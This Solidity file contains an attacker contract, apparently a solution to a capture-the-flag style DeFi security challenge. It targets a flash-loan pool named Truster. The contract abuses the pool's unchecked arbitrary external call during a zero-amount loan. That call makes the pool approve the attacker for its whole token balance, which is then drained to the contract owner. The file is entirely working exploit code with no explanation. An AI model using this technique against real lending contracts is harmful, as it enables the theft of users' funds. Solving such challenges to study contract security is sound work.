// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
}

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;

    function damnValuableToken() external returns (address);
}

contract TrusterAttacker {

    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _pool) external {
        ITrusterLenderPool pool = ITrusterLenderPool(_pool);

        IERC20 dvt = IERC20(pool.damnValuableToken());

        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), dvt.balanceOf(_pool));

        pool.flashLoan(0, address(this), address(dvt), payload);

        dvt.transferFrom(_pool, owner, dvt.balanceOf(_pool));
    }
}